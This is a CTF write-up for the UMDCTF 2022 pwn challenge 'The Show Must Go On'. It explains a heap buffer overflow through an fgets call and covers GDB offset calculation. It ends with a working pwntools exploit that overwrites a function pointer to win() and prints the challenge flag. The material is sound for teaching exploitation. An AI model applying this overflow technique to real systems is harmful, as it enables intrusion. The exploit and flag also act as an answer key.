# UMDCTF 2022

## The Show Must Go On

> We are in the business of entertainment, the show must go on! Hope we can
> find someone to replace our old act super fast...  
>  
> **Author**: WittsEnd2  
>  
> `0.cloud.chals.io 30138`  
>  
> [`theshow`](theshow)

Tags: _pwn_ _x86-64_ _bof_ _heap_

## Summary

BOF in embryo heap (vs stack) to change a function pointer to `win`.

> The binary is static linked.  So a bit more looking around.  You'll lose a
> lot of time if you do not discover the `win` function.

## Analysis

### Checksec

```  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
```

No PIE is all we need to call `win`.

### Ghidra Decompile

```c  
undefined8 setup(void)  
{  
 undefined8 *puVar1;  
 long in_FS_OFFSET;  
 int local_44;  
 char *local_40;  
 undefined local_38 [40];  
 long local_10;  
  
 local_10 = *(long *)(in_FS_OFFSET + 0x28);  
 local_40 = (char *)0x0;  
 local_44 = 0;  
 message1 = (undefined8 *)malloc_set(0x50);  
 message2 = (undefined8 *)malloc_set(0x60);  
 message3 = (undefined8 *)malloc_set(0x80);  
 puVar1 = message1;  
 *message1 = 0x20656d6f636c6557;  
 puVar1[1] = 0x6320656874206f74;  
 puVar1[2] = 0x6c63207964656d6f;  
 *(undefined4 *)(puVar1 + 3) = 0xa216275;  
 puVar1 = message2;  
 *message2 = 0x20796c6e6f206557;  
 puVar1[1] = 0x6568742065766168;  
 puVar1[2] = 0x6f63207473656220;  
 puVar1[3] = 0x20736e616964656d;  
 *(undefined4 *)(puVar1 + 4) = 0x65726568;  
 *(undefined *)((long)puVar1 + 0x24) = 0x21;  
 puVar1 = message3;  
 *message3 = 0x6820657361656c50;  
 puVar1[1] = 0x7320737520706c65;  
 puVar1[2] = 0x6f66207075207465;  
 puVar1[3] = 0x612072756f792072;  
 *(undefined4 *)(puVar1 + 4) = 0xa7463;  
 printf("%s",message1);  
 printf("%s",message2);  
 printf("%s",message3);  
 puts("What is the name of your act?");  
 __isoc99_scanf(&DAT_004bb1e6,local_38);  
 mainAct = malloc_set(0x68);  
 thunk_FUN_0040054e(mainAct,local_38,0x20);  
 local_40 = crypt("Main_Act_Is_The_Best",salt);  
 thunk_FUN_0040054e(mainAct + 0x20,local_40,0x40);  
 puts("Your act code is: Main_Act_Is_The_Best");  
 *(code **)(mainAct + 0x60) = tellAJoke;  
 currentAct = mainAct;  
 free(message1);  
 free(message3);  
 puts("How long do you want the show description to be?");  
 __isoc99_scanf(&DAT_004bb2a2,&local_44);  
 showDescription = (char *)malloc_set((long)(local_44 + 8));  
 puts("Describe the show for us:");  
 getchar();  
 fgets(showDescription,500,(FILE *)stdin);  
 actList._0_8_ = mainAct;  
 if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {  
   __stack_chk_fail();  
 }  
 return 0;  
}  
```

The vuln is `fgets`:

```c  
 puts("How long do you want the show description to be?");  
 __isoc99_scanf(&DAT_004bb2a2,&local_44);  
 showDescription = (char *)malloc_set((long)(local_44 + 8));  
 puts("Describe the show for us:");  
 getchar();  
 fgets(showDescription,500,(FILE *)stdin);  
```

The length of `showDescription` is dynamic, but `fgets` will read up to `500`
bytes.  This creates an opportunity to corrupt the heap.

There are four `malloc_set` calls before the `malloc_set` for
`showDescription`.  The fourth is for the `mainAct` struct; `0x60` offset into
that struct is a pointer to a function:

```c  
*(code **)(mainAct + 0x60) = tellAJoke;  
```

We just need to change that to `win`, that's it.

Just before we're prompted for show length, the following `free`s are called:

```c  
 free(message1);  
 free(message3);  
```

If we set our show length to the same as `message3` (`0x80`, see the
decompile), then we should be sitting in the heap right above the `mainAct`
struct (heap memory optimization for reuse).  If so, then overwriting the
function pointer is trivial.

The request size needs to be `0x80` - `8` (`120`), since the code will add `8`
to our value:

```c  
showDescription = (char *)malloc_set((long)(local_44 + 8));  
```

To overwrite the function pointer we'll need to send `0x80` bytes to exhaust
our allocation + `16` bytes for the heap structure (Google for some heap
diagrams) + `0x60` (offset into `mainAct` for function pointer).  So that's
`0x80 + 16 + 0x60` (`240`).

Alternatively you can use GDB:

```  
gef➤  run  
Starting program: /pwd/datajerk/umdctf2022/theshow/theshow  
Welcome to the comedy club!  
We only have the best comedians here!Please help us set up for your act  
What is the name of your act?  
FOOBAR  
Your act code is: Main_Act_Is_The_Best  
How long do you want the show description to be?  
^C  
Program received signal SIGINT, Interrupt.  
```

Start it, put in a string (e.g. `FOOBAR`), ctrl-C, then:

```  
gef➤  grep FOOBAR  
[+] Searching 'FOOBAR' in memory  
[+] In '[heap]'(0x6e9000-0x73b000), permission=rw-  
 0x719c90 - 0x719c96  →   "FOOBAR"  
```

Note the `0x719c90` location and type `c`:

The last prompt was `How long do you want the show description to be?`, and we
already determined above it needs to be `120`, so type that in:

```  
gef➤  c  
Continuing.  
120  
Describe the show for us:  
BLAHBLAH  
What would you like to do?  
+-------------+  
|   Actions   |  
|-------------|  
| Perform Act |  
| Switch Act  |  
| End Show    |  
+-------------|  
Action: ^C  
```

Enter something else (e.g. `BLAHBLAH`), and then ctrl-C and search for it:

```  
gef➤  grep BLAHBLAH  
[+] Searching 'BLAHBLAH' in memory  
[+] In '[heap]'(0x6e9000-0x73b000), permission=rw-  
 0x719c00 - 0x719c0a  →   "BLAHBLAH\n"  
```

Verify that `0x719c00` (location of `BLAHBLAH`) is less than `0x719c90`
(location of `FOOBAR`), if so, you're a winner.  Just subtract one from the
other and add `0x60` for the function pointer offset:

```  
gef➤  p/d 0x719c90 - 0x719c00 + 0x60  
$1 = 240  
```  
  
  
## Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./theshow',checksec=False)

if args.REMOTE:  
   p = remote('0.cloud.chals.io', 30138)  
else:  
   p = process(binary.path)

p.sendlineafter(b'act?\n', b'foo')  
p.sendlineafter(b'be?\n', b'120')

payload  = b''  
payload += 240 * b'A'  
payload += p64(binary.sym.win)

p.sendlineafter(b'us:\n', payload)  
p.sendlineafter(b'Action: ', b'1')

flag = p.recvline().strip().decode()

p.close()  
print(flag)  
```

Output:

```bash  
# ./exploit.py REMOTE=1  
[+] Opening connection to 0.cloud.chals.io on port 30138: Done  
[*] Closed connection to 0.cloud.chals.io port 30138  
UMDCTF{b1ns_cAN_B3_5up3r_f4st}  
```

Original writeup (https://github.com/datajerk/ctf-write-
ups/tree/master/umdctf2022/theshow).